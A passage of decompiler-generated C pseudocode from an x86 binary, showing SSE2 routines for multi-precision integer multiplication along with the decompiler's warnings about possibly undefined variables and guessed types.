  __m128i v47; // xmm1
  __m128i v48; // xmm4
  __m128i v49; // xmm5
  int v50; // ecx
  __m128i v51; // xmm6
  __m128i v52; // xmm5
  __m128i v53; // xmm4
  __m128i *v54; // edx
  __m128i v55; // xmm7
  __m128i v56; // xmm0
  __m128i v57; // xmm7
  __m128i v58; // xmm6
  __m128i v59; // xmm4
  __m128i v60; // xmm5
  __m128i v61; // xmm6
  __m128i v62; // xmm7
  __m128i v63; // xmm0
  __m128i v64; // xmm1
  __m128i v65; // xmm4
  __m128i v66; // xmm5
  int v67; // ecx
  __m128i v68; // xmm6
  __m128i v69; // xmm5
  __m128i v70; // xmm4
  __m128i v71; // xmm7
  __m128i v72; // xmm0
  __m128i *v73; // edx
  __m128i v74; // xmm7
  __m128i v75; // xmm6
  __m128i v76; // xmm4
  __m128i v77; // xmm5
  __m128i v78; // xmm6
  __m128i v79; // xmm7
  __m128i v80; // xmm0
  __m128i v81; // xmm1
  __m128i v82; // xmm4
  __m128i v83; // xmm5
  int v84; // ecx
  __m128i v85; // xmm6
  __m128i v86; // xmm5
  __m128i v87; // xmm4
  __m128i *v88; // edx
  __m128i v89; // xmm7
  __m128i v90; // xmm0
  __m128i v91; // xmm7
  __m128i v92; // xmm6
  __m128i v93; // xmm4
  __m128i v94; // xmm5
  __m128i v95; // xmm6
  __m128i v96; // xmm7
  __m128i v97; // xmm0
  __m128i v98; // xmm1
  __m128i v99; // xmm4
  __m128i v100; // xmm5
  int v101; // ecx
  __m128i v102; // xmm6
  __m128i v103; // xmm5
  __m128i v104; // xmm4
  __m128i v105; // xmm7
  __m128i v106; // xmm0
  __m128i *v107; // edx
  __m128i v108; // xmm7
  __m128i v109; // xmm6
  __m128i v110; // xmm2
  __m128i v111; // xmm5
  __m128i v112; // xmm6
  __m128i v113; // xmm7
  __m128i v114; // xmm0
  __m128i v115; // xmm1
  __m128i v116; // xmm4
  __m128i v117; // xmm5
  __m128i v118; // xmm6
  __m128i v119; // [esp+10h] [ebp-CCh] BYREF
  __m128i v120; // [esp+20h] [ebp-BCh] BYREF
  __m128i v121; // [esp+30h] [ebp-ACh] BYREF
  __m128i v122; // [esp+40h] [ebp-9Ch] BYREF
  __m128i v123; // [esp+50h] [ebp-8Ch]
  __m128i v124[3]; // [esp+60h] [ebp-7Ch]
  __m128i v125; // [esp+90h] [ebp-4Ch] BYREF
  __m128i v126; // [esp+A0h] [ebp-3Ch] BYREF
  __m128i v127; // [esp+B0h] [ebp-2Ch] BYREF
  __m128i v128; // [esp+C0h] [ebp-1Ch] BYREF

  for ( i = 0; i != 32; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)((char *)&v119 + 2 * i) = v4;
    *(__m128i *)((char *)&v120 + 2 * i) = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v123 + 2 * i) = v5;
    v124[i / 8] = _mm_srli_epi64(v5, 0x20u);
    *(__m128i *)((char *)&v125 + 2 * i) = v6;
    *(__m128i *)((char *)&v126 + 2 * i) = _mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v125);
  v8 = _mm_mul_epu32(_mm_load_si128(&v119), v7);
  si128 = _mm_load_si128(&stru_4BACE0);
  v10 = _mm_and_si128(si128, v8);
  v11 = _mm_mul_epu32(v7, v123);
  v12 = _mm_and_si128(si128, v11);
  v13 = _mm_srli_epi32(v11, 0x10u);
  v14 = _mm_move_epi64(v12);
  v15 = _mm_move_epi64(v13);
  v16 = _mm_add_epi32(v10, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v12, v14), v14), 4));
  v17 = _mm_add_epi32(_mm_srli_epi32(v8, 0x10u), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  *(_DWORD *)a1 = _mm_cvtsi128_si32(v16);
  v18 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v16), 0x10u), _mm_move_epi64(v17));
  v19 = _mm_unpackhi_epi64(v17, v14);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v20 = _mm_add_epi32(_mm_unpackhi_epi64(v16, v14), _mm_srli_epi64(v18, 0x30u));
  v21 = _mm_load_si128(&v125);
  v22 = _mm_mul_epu32(_mm_load_si128(&v120), v21);
  v23 = _mm_mul_epu32(v21, v124[0]);
  v24 = _mm_load_si128(&stru_4BACE0);
  v25 = _mm_add_epi32(v20, _mm_and_si128(v24, v22));
  v26 = _mm_add_epi32(v19, _mm_srli_epi32(v22, 0x10u));
  v27 = _mm_and_si128(v24, v23);
  v28 = _mm_srli_epi32(v23, 0x10u);
  sub_44717E((int)&v120, &v125);
  v29 = _mm_move_epi64(v27);
  v30 = _mm_move_epi64(v28);
  v31 = _mm_add_epi32(v25, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v29), v29), 4));
  v32 = _mm_add_epi32(v26, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v30), v30), 4));
  *(_DWORD *)(v33 + 8) = _mm_cvtsi128_si32(v31);
  v34 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v31), 0x10u), _mm_move_epi64(v32));
  v35 = _mm_unpackhi_epi64(v32, v29);
  *(_QWORD *)(v33 + 10) = v34.m128i_i64[0];
  v36 = _mm_add_epi32(_mm_unpackhi_epi64(v31, v29), _mm_srli_epi64(v34, 0x30u));
  v37 = _mm_load_si128(&v126);
  v38 = _mm_mul_epu32(_mm_load_si128(&v120), v37);
  v40 = _mm_mul_epu32(v37, *v39);
  v41 = _mm_load_si128(&stru_4BACE0);
  v42 = _mm_add_epi32(v36, _mm_and_si128(v41, v38));
  v43 = _mm_add_epi32(v35, _mm_srli_epi32(v38, 0x10u));
  v44 = _mm_and_si128(v41, v40);
  v45 = _mm_srli_epi32(v40, 0x10u);
  sub_447141();
  v46 = _mm_move_epi64(v44);
  v47 = _mm_move_epi64(v45);
  v48 = _mm_add_epi32(v42, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v44, v46), v46), 4));
  v49 = _mm_add_epi32(v43, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v45, v47), v47), 4));
  *(_DWORD *)(v50 + 16) = _mm_cvtsi128_si32(v48);
  v51 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v48), 0x10u), _mm_move_epi64(v49));
  v52 = _mm_unpackhi_epi64(v49, v46);
  *(_QWORD *)(v50 + 18) = v51.m128i_i64[0];
  v53 = _mm_add_epi32(_mm_unpackhi_epi64(v48, v46), _mm_srli_epi64(v51, 0x30u));
  v55 = _mm_load_si128(&v126);
  v56 = _mm_mul_epu32(_mm_load_si128(&v121), v55);
  v57 = _mm_mul_epu32(v55, v54[1]);
  v58 = _mm_load_si128(&stru_4BACE0);
  v59 = _mm_add_epi32(v53, _mm_and_si128(v58, v56));
  v60 = _mm_add_epi32(v52, _mm_srli_epi32(v56, 0x10u));
  v61 = _mm_and_si128(v58, v57);
  v62 = _mm_srli_epi32(v57, 0x10u);
  sub_447104();
  v63 = _mm_move_epi64(v61);
  v64 = _mm_move_epi64(v62);
  v65 = _mm_add_epi32(v59, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v61, v63), v63), 4));
  v66 = _mm_add_epi32(v60, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v62, v64), v64), 4));
  *(_DWORD *)(v67 + 24) = _mm_cvtsi128_si32(v65);
  v68 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v65), 0x10u), _mm_move_epi64(v66));
  v69 = _mm_unpackhi_epi64(v66, v63);
  *(_QWORD *)(v67 + 26) = v68.m128i_i64[0];
  v70 = _mm_add_epi32(_mm_unpackhi_epi64(v65, v63), _mm_srli_epi64(v68, 0x30u));
  v71 = _mm_load_si128(&v127);
  v72 = _mm_mul_epu32(_mm_load_si128(&v121), v71);
  v74 = _mm_mul_epu32(v71, *v73);
  v75 = _mm_load_si128(&stru_4BACE0);
  v76 = _mm_add_epi32(v70, _mm_and_si128(v75, v72));
  v77 = _mm_add_epi32(v69, _mm_srli_epi32(v72, 0x10u));
  v78 = _mm_and_si128(v75, v74);
  v79 = _mm_srli_epi32(v74, 0x10u);
  sub_447141();
  v80 = _mm_move_epi64(v78);
  v81 = _mm_move_epi64(v79);
  v82 = _mm_add_epi32(v76, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v78, v80), v80), 4));
  v83 = _mm_add_epi32(v77, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v79, v81), v81), 4));
  *(_DWORD *)(v84 + 32) = _mm_cvtsi128_si32(v82);
  v85 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v82), 0x10u), _mm_move_epi64(v83));
  v86 = _mm_unpackhi_epi64(v83, v80);
  *(_QWORD *)(v84 + 34) = v85.m128i_i64[0];
  v87 = _mm_add_epi32(_mm_unpackhi_epi64(v82, v80), _mm_srli_epi64(v85, 0x30u));
  v89 = _mm_load_si128(&v127);
  v90 = _mm_mul_epu32(_mm_load_si128(&v122), v89);
  v91 = _mm_mul_epu32(v89, v88[1]);
  v92 = _mm_load_si128(&stru_4BACE0);
  v93 = _mm_add_epi32(v87, _mm_and_si128(v92, v90));
  v94 = _mm_add_epi32(v86, _mm_srli_epi32(v90, 0x10u));
  v95 = _mm_and_si128(v92, v91);
  v96 = _mm_srli_epi32(v91, 0x10u);
  sub_44717E((int)&v122, &v127);
  v97 = _mm_move_epi64(v95);
  v98 = _mm_move_epi64(v96);
  v99 = _mm_add_epi32(v93, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v95, v97), v97), 4));
  v100 = _mm_add_epi32(v94, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v96, v98), v98), 4));
  *(_DWORD *)(v101 + 40) = _mm_cvtsi128_si32(v99);
  v102 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v99), 0x10u), _mm_move_epi64(v100));
  v103 = _mm_unpackhi_epi64(v100, v97);
  *(_QWORD *)(v101 + 42) = v102.m128i_i64[0];
  v104 = _mm_add_epi32(_mm_unpackhi_epi64(v99, v97), _mm_srli_epi64(v102, 0x30u));
  v105 = _mm_load_si128(&v128);
  v106 = _mm_mul_epu32(_mm_load_si128(&v122), v105);
  v108 = _mm_mul_epu32(v105, *v107);
  v109 = _mm_load_si128(&stru_4BACE0);
  v110 = _mm_and_si128(v109, v106);
  v111 = _mm_add_epi32(v103, _mm_srli_epi32(v106, 0x10u));
  v112 = _mm_and_si128(v109, v108);
  v113 = _mm_srli_epi32(v108, 0x10u);
  v114 = _mm_move_epi64(v112);
  v115 = _mm_move_epi64(v113);
  v116 = _mm_add_epi32(
           _mm_add_epi32(v104, v110),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v112, v114), v114), 4));
  v117 = _mm_add_epi32(v111, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v113, v115), v115), 4));
  *(_DWORD *)(v101 + 48) = _mm_cvtsi128_si32(v116);
  v118 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v116), 0x10u), _mm_move_epi64(v117));
  *(_QWORD *)(v101 + 50) = v118.m128i_i64[0];
  *(_QWORD *)(v101 + 56) = _mm_add_epi64(
                             _mm_add_epi32(_mm_unpackhi_epi64(v116, v114), _mm_srli_epi64(v118, 0x30u)),
                             _mm_slli_epi64(_mm_unpackhi_epi64(v117, v114), 0x10u)).m128i_u64[0];
}
// 447280: variable 'v33' is possibly undefined
// 4472B7: variable 'v39' is possibly undefined
// 447310: variable 'v50' is possibly undefined
// 447337: variable 'v54' is possibly undefined
// 4473A3: variable 'v67' is possibly undefined
// 4473DA: variable 'v73' is possibly undefined
// 447433: variable 'v84' is possibly undefined
// 44745A: variable 'v88' is possibly undefined
// 4474C6: variable 'v101' is possibly undefined
// 4474FB: variable 'v107' is possibly undefined
// 4BACE0: using guessed type __m128i stru_4BACE0;
// 447050: using guessed type __m128i anonymous_3;

//----- (00447104) --------------------------------------------------------
int sub_447104()
{
  return sub_447141();
}
// 447141: using guessed type int sub_447141(void);

//----- (00447141) --------------------------------------------------------
int sub_447141()
{
  return sub_44717E();
}
// 44717E: using guessed type int sub_44717E(void);

//----- (0044717E) --------------------------------------------------------
__m128i __usercall sub_44717E@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (00447590) --------------------------------------------------------
int __cdecl sub_447590(int a1, int a2, int a3)
{
  unsigned int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm5
  __m128i si128; // xmm6
  __m128i v10; // xmm4
  __m128i v11; // xmm7
  __m128i v12; // xmm6
  __m128i v13; // xmm7
  __m128i v14; // xmm0
  __m128i v15; // xmm1
  __m128i v16; // xmm4
  __m128i v17; // xmm5
  __m128i v18; // xmm6
  __m128i v19; // xmm5
  __m128i v20; // xmm4
  __m128i v21; // xmm7
  __m128i v22; // xmm0
  __m128i v23; // xmm7
  __m128i v24; // xmm6
  __m128i v25; // xmm4
  __m128i v26; // xmm5
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm0
  __m128i v30; // xmm1
  __m128i v31; // xmm4
  __m128i v32; // xmm5
  int v33; // ecx
  __m128i v34; // xmm6
  __m128i v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm0
  __m128i *v39; // edx
  __m128i v40; // xmm7
  __m128i v41; // xmm6
  __m128i v42; // xmm4
  __m128i v43; // xmm5
  __m128i v44; // xmm6
  __m128i v45; // xmm7
  __m128i v46; // xmm0
  __m128i v47; // xmm1
  __m128i v48; // xmm4
  __m128i v49; // xmm5
  int v50; // ecx
  __m128i v51; // xmm6
  __m128i v52; // xmm5
  __m128i v53; // xmm4
  __m128i *v54; // edx
  __m128i v55; // xmm7
  __m128i v56; // xmm0
  __m128i v57; // xmm7
  __m128i v58; // xmm6
  __m128i v59; // xmm4
  __m128i v60; // xmm5
  __m128i v61; // xmm6
  __m128i v62; // xmm7
  __m128i v63; // xmm0
  __m128i v64; // xmm1
  __m128i v65; // xmm4
  __m128i v66; // xmm5
  int v67; // ecx
  __m128i v68; // xmm6
  __m128i v69; // xmm5
  __m128i v70; // xmm4
  __m128i v71; // xmm7
  __m128i v72; // xmm0
  __m128i *v73; // edx
  __m128i v74; // xmm7
  __m128i v75; // xmm6
  __m128i v76; // xmm4
  __m128i v77; // xmm5
  __m128i v78; // xmm6
  __m128i v79; // xmm7
  __m128i v80; // xmm0
  __m128i v81; // xmm1
  __m128i v82; // xmm4
  __m128i v83; // xmm5
  int v84; // ecx
  __m128i v85; // xmm6
  __m128i v86; // xmm5
  __m128i v87; // xmm4
  __m128i *v88; // edx
  __m128i v89; // xmm7
  __m128i v90; // xmm0
  __m128i v91; // xmm7
  __m128i v92; // xmm6
  __m128i v93; // xmm4
  __m128i v94; // xmm5
  __m128i v95; // xmm6
  __m128i v96; // xmm7
  __m128i v97; // xmm0
  __m128i v98; // xmm1
  __m128i v99; // xmm4
  __m128i v100; // xmm5
  int v101; // ecx
  __m128i v102; // xmm6
  __m128i v103; // xmm5
  __m128i v104; // xmm4
  __m128i v105; // xmm7
  __m128i v106; // xmm0
  __m128i *v107; // edx
  __m128i v108; // xmm7
  __m128i v109; // xmm6
  __m128i v110; // xmm4
  __m128i v111; // xmm5
  __m128i v112; // xmm6
  __m128i v113; // xmm7
  int result; // eax
  __m128i v115; // xmm0
  __m128i v116; // xmm1
  __m128i v117; // xmm4
  __m128i v118; // xmm5
  __m128 v119; // xmm7
  int v120; // ecx
  __m128i v121; // xmm6
  __m128i v122; // xmm4
  __m128i *v123; // edx
  __m128i v124; // xmm6
  __m128i v125; // xmm1
  __m128i v126; // xmm4
  __m128i v127; // xmm6
  __m128i v128; // xmm1
  __m128i v129; // xmm4
  __m128i v130; // xmm6
  __m128i v131; // xmm1
  __m128i v132; // xmm4
  __m128i v133; // xmm6
  __m128i v134; // xmm1
  __m128i v135; // xmm4
  __m128i v136; // xmm6
  __m128i v137; // xmm1
  __m128i v138; // xmm4
  __m128i v139; // xmm6
  __m128i v140; // xmm1
  __m128i v141; // xmm4
  __m128i v142; // xmm6
  __m128i v143; // xmm1
  __m128 v144; // xmm6
  __m128i v145; // [esp+10h] [ebp-18Ch] BYREF
  __m128i v146; // [esp+20h] [ebp-17Ch] BYREF
  __m128i v147; // [esp+30h] [ebp-16Ch] BYREF
  __m128i v148; // [esp+40h] [ebp-15Ch] BYREF
  __m128i v149; // [esp+50h] [ebp-14Ch] BYREF
  __m128i v150; // [esp+60h] [ebp-13Ch] BYREF
  __m128i v151; // [esp+70h] [ebp-12Ch] BYREF
  __m128i v152; // [esp+80h] [ebp-11Ch] BYREF
  __m128i v153; // [esp+90h] [ebp-10Ch]
  __m128i v154[7]; // [esp+A0h] [ebp-FCh]
  __m128i v155; // [esp+110h] [ebp-8Ch] BYREF
  __m128i v156; // [esp+120h] [ebp-7Ch] BYREF
  __m128i v157; // [esp+130h] [ebp-6Ch] BYREF
  __m128i v158; // [esp+140h] [ebp-5Ch] BYREF
  __m128i v159; // [esp+150h] [ebp-4Ch] BYREF
  __m128i v160; // [esp+160h] [ebp-3Ch] BYREF
  __m128i v161; // [esp+170h] [ebp-2Ch] BYREF
  __m128i v162; // [esp+180h] [ebp-1Ch] BYREF

  for ( i = 0; i != 64; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)((char *)&v145 + 2 * i) = v4;
    *(__m128i *)((char *)&v146 + 2 * i) = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v153 + 2 * i) = v5;
    v154[i / 8] = _mm_srli_epi64(v5, 0x20u);
    *(__m128i *)((char *)&v155 + 2 * i) = v6;
    *(__m128i *)((char *)&v156 + 2 * i) = _mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v155);
  v8 = _mm_mul_epu32(_mm_load_si128(&v145), v7);
  si128 = _mm_load_si128(&stru_4BACE0);
  v10 = _mm_and_si128(si128, v8);
  v11 = _mm_mul_epu32(v7, v153);
  v12 = _mm_and_si128(si128, v11);
  v13 = _mm_srli_epi32(v11, 0x10u);
  v14 = _mm_move_epi64(v12);
  v15 = _mm_move_epi64(v13);
  v16 = _mm_add_epi32(v10, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v12, v14), v14), 4));
  v17 = _mm_add_epi32(_mm_srli_epi32(v8, 0x10u), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  *(_DWORD *)a1 = _mm_cvtsi128_si32(v16);
  v18 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v16), 0x10u), _mm_move_epi64(v17));
  v19 = _mm_unpackhi_epi64(v17, v14);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v20 = _mm_add_epi32(_mm_unpackhi_epi64(v16, v14), _mm_srli_epi64(v18, 0x30u));
  v21 = _mm_load_si128(&v155);
  v22 = _mm_mul_epu32(_mm_load_si128(&v146), v21);
  v23 = _mm_mul_epu32(v21, v154[0]);
  v24 = _mm_load_si128(&stru_4BACE0);
  v25 = _mm_add_epi32(v20, _mm_and_si128(v24, v22));
  v26 = _mm_add_epi32(v19, _mm_srli_epi32(v22, 0x10u));
  v27 = _mm_and_si128(v24, v23);
  v28 = _mm_srli_epi32(v23, 0x10u);
  sub_44777E((int)&v146, &v155);
  v29 = _mm_move_epi64(v27);
  v30 = _mm_move_epi64(v28);
  v31 = _mm_add_epi32(v25, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v29), v29), 4));
  v32 = _mm_add_epi32(v26, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v30), v30), 4));
  *(_DWORD *)(v33 + 8) = _mm_cvtsi128_si32(v31);
  v34 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v31), 0x10u), _mm_move_epi64(v32));
  v35 = _mm_unpackhi_epi64(v32, v29);
  *(_QWORD *)(v33 + 10) = v34.m128i_i64[0];
  v36 = _mm_add_epi32(_mm_unpackhi_epi64(v31, v29), _mm_srli_epi64(v34, 0x30u));
  v37 = _mm_load_si128(&v156);
  v38 = _mm_mul_epu32(_mm_load_si128(&v146), v37);
  v40 = _mm_mul_epu32(v37, *v39);
  v41 = _mm_load_si128(&stru_4BACE0);
  v42 = _mm_add_epi32(v36, _mm_and_si128(v41, v38));
  v43 = _mm_add_epi32(v35, _mm_srli_epi32(v38, 0x10u));
  v44 = _mm_and_si128(v41, v40);
  v45 = _mm_srli_epi32(v40, 0x10u);
  sub_447741();
  v46 = _mm_move_epi64(v44);
  v47 = _mm_move_epi64(v45);
  v48 = _mm_add_epi32(v42, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v44, v46), v46), 4));
  v49 = _mm_add_epi32(v43, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v45, v47), v47), 4));
  *(_DWORD *)(v50 + 16) = _mm_cvtsi128_si32(v48);
  v51 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v48), 0x10u), _mm_move_epi64(v49));
  v52 = _mm_unpackhi_epi64(v49, v46);
  *(_QWORD *)(v50 + 18) = v51.m128i_i64[0];
  v53 = _mm_add_epi32(_mm_unpackhi_epi64(v48, v46), _mm_srli_epi64(v51, 0x30u));
  v55 = _mm_load_si128(&v156);
  v56 = _mm_mul_epu32(_mm_load_si128(&v147), v55);
  v57 = _mm_mul_epu32(v55, v54[1]);
  v58 = _mm_load_si128(&stru_4BACE0);
  v59 = _mm_add_epi32(v53, _mm_and_si128(v58, v56));
  v60 = _mm_add_epi32(v52, _mm_srli_epi32(v56, 0x10u));
  v61 = _mm_and_si128(v58, v57);
  v62 = _mm_srli_epi32(v57, 0x10u);
  sub_447704();
  v63 = _mm_move_epi64(v61);
  v64 = _mm_move_epi64(v62);
  v65 = _mm_add_epi32(v59, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v61, v63), v63), 4));
  v66 = _mm_add_epi32(v60, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v62, v64), v64), 4));
  *(_DWORD *)(v67 + 24) = _mm_cvtsi128_si32(v65);
  v68 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v65), 0x10u), _mm_move_epi64(v66));
  v69 = _mm_unpackhi_epi64(v66, v63);
  *(_QWORD *)(v67 + 26) = v68.m128i_i64[0];
  v70 = _mm_add_epi32(_mm_unpackhi_epi64(v65, v63), _mm_srli_epi64(v68, 0x30u));
  v71 = _mm_load_si128(&v157);
  v72 = _mm_mul_epu32(_mm_load_si128(&v147), v71);
  v74 = _mm_mul_epu32(v71, *v73);
  v75 = _mm_load_si128(&stru_4BACE0);
  v76 = _mm_add_epi32(v70, _mm_and_si128(v75, v72));
  v77 = _mm_add_epi32(v69, _mm_srli_epi32(v72, 0x10u));
  v78 = _mm_and_si128(v75, v74);
  v79 = _mm_srli_epi32(v74, 0x10u);
  sub_4476C7();
  v80 = _mm_move_epi64(v78);
  v81 = _mm_move_epi64(v79);
  v82 = _mm_add_epi32(v76, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v78, v80), v80), 4));
  v83 = _mm_add_epi32(v77, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v79, v81), v81), 4));
  *(_DWORD *)(v84 + 32) = _mm_cvtsi128_si32(v82);
  v85 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v82), 0x10u), _mm_move_epi64(v83));
  v86 = _mm_unpackhi_epi64(v83, v80);
  *(_QWORD *)(v84 + 34) = v85.m128i_i64[0];
  v87 = _mm_add_epi32(_mm_unpackhi_epi64(v82, v80), _mm_srli_epi64(v85, 0x30u));
  v89 = _mm_load_si128(&v157);
  v90 = _mm_mul_epu32(_mm_load_si128(&v148), v89);
  v91 = _mm_mul_epu32(v89, v88[1]);
  v92 = _mm_load_si128(&stru_4BACE0);
  v93 = _mm_add_epi32(v87, _mm_and_si128(v92, v90));
  v94 = _mm_add_epi32(v86, _mm_srli_epi32(v90, 0x10u));
  v95 = _mm_and_si128(v92, v91);
  v96 = _mm_srli_epi32(v91, 0x10u);
  sub_44768A();
  v97 = _mm_move_epi64(v95);
  v98 = _mm_move_epi64(v96);
  v99 = _mm_add_epi32(v93, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v95, v97), v97), 4));
  v100 = _mm_add_epi32(v94, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v96, v98), v98), 4));
  *(_DWORD *)(v101 + 40) = _mm_cvtsi128_si32(v99);
  v102 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v99), 0x10u), _mm_move_epi64(v100));
  v103 = _mm_unpackhi_epi64(v100, v97);
  *(_QWORD *)(v101 + 42) = v102.m128i_i64[0];
  v104 = _mm_add_epi32(_mm_unpackhi_epi64(v99, v97), _mm_srli_epi64(v102, 0x30u));
  v105 = _mm_load_si128(&v158);
  v106 = _mm_mul_epu32(_mm_load_si128(&v148), v105);
  v108 = _mm_mul_epu32(v105, *v107);
  v109 = _mm_load_si128(&stru_4BACE0);
  v110 = _mm_add_epi32(v104, _mm_and_si128(v109, v106));
  v111 = _mm_add_epi32(v103, _mm_srli_epi32(v106, 0x10u));
  v112 = _mm_and_si128(v109, v108);
  v113 = _mm_srli_epi32(v108, 0x10u);
  result = sub_44764D();
  v115 = _mm_move_epi64(v112);
  v116 = _mm_move_epi64(v113);
  v117 = _mm_add_epi32(v110, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v112, v115), v115), 4));
  v118 = _mm_add_epi32(v111, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v113, v116), v116), 4));
  v119 = (__m128)_mm_move_epi64(v118);
  *(_DWORD *)(v120 + 48) = _mm_cvtsi128_si32(v117);
  v121 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v117), 0x10u), (__m128i)v119);
  *(_QWORD *)(v120 + 50) = v121.m128i_i64[0];
  v122 = _mm_add_epi32(_mm_unpackhi_epi64(v117, v115), _mm_srli_epi64(v121, 0x30u));
  ++v123;
  v124 = _mm_load_si128(&v158);
  v125 = _mm_load_si128(&v162);
  v126 = _mm_add_epi64(
           _mm_add_epi64(
             _mm_add_epi64(v122, _mm_mul_epu32(_mm_load_si128(&v149), v124)),
             _mm_slli_epi64(_mm_unpackhi_epi64(v118, v115), 0x10u)),
           _mm_mul_epu32(_mm_load_si128(&v145), v125));
  v127 = _mm_add_epi32(_mm_mul_epu32(v124, *v123), _mm_mul_epu32(v125, v123[-4]));
  v128 = _mm_load_si128(&v155);
  v129 = _mm_add_epi64(v126, _mm_mul_epu32(_mm_load_si128(&v152), v128));
  v130 = _mm_add_epi32(v127, _mm_mul_epu32(v128, v123[3]));
  v131 = _mm_load_si128(&v161);
  v132 = _mm_add_epi64(v129, _mm_mul_epu32(_mm_load_si128(&v146), v131));
  v133 = _mm_add_epi32(v130, _mm_mul_epu32(v131, v123[-3]));
  v134 = _mm_load_si128(&v156);
  v135 = _mm_add_epi64(v132, _mm_mul_epu32(_mm_load_si128(&v151), v134));
  v136 = _mm_add_epi32(v133, _mm_mul_epu32(v134, v123[2]));
  v137 = _mm_load_si128(&v160);
  v138 = _mm_add_epi64(v135, _mm_mul_epu32(_mm_load_si128(&v147), v137));
  v139 = _mm_add_epi32(v136, _mm_mul_epu32(v137, v123[-2]));
  v140 = _mm_load_si128(&v157);
  v141 = _mm_add_epi64(v138, _mm_mul_epu32(_mm_load_si128(&v150), v140));
  v142 = _mm_add_epi32(v139, _mm_mul_epu32(v140, v123[1]));
  v143 = _mm_load_si128(&v159);
  v144 = (__m128)_mm_add_epi32(v142, _mm_mul_epu32(v143, v123[-1]));
  *(_QWORD *)(v120 + 56) = _mm_add_epi32(
                             _mm_add_epi64(v141, _mm_mul_epu32(_mm_load_si128(&v148), v143)),
                             _mm_slli_epi64(_mm_add_epi32((__m128i)v144, (__m128i)_mm_movehl_ps(v119, v144)), 0x20u)).m128i_u64[0];
  return result;
}
// 447880: variable 'v33' is possibly undefined
// 4478B7: variable 'v39' is possibly undefined
// 447910: variable 'v50' is possibly undefined
// 447937: variable 'v54' is possibly undefined
// 4479A3: variable 'v67' is possibly undefined
// 4479DA: variable 'v73' is possibly undefined
// 447A33: variable 'v84' is possibly undefined
// 447A5A: variable 'v88' is possibly undefined
// 447AC6: variable 'v101' is possibly undefined
// 447AFD: variable 'v107' is possibly undefined
// 447B56: variable 'v120' is possibly undefined
// 447B7D: variable 'v123' is possibly undefined
// 4BACE0: using guessed type __m128i stru_4BACE0;
// 447590: using guessed type __m128i anonymous_11;

//----- (0044764D) --------------------------------------------------------
int sub_44764D()
{
  return sub_44768A();
}
// 44768A: using guessed type int sub_44768A(void);

//----- (0044768A) --------------------------------------------------------
int sub_44768A()
{
  return sub_4476C7();
}
// 4476C7: using guessed type int sub_4476C7(void);

//----- (004476C7) --------------------------------------------------------
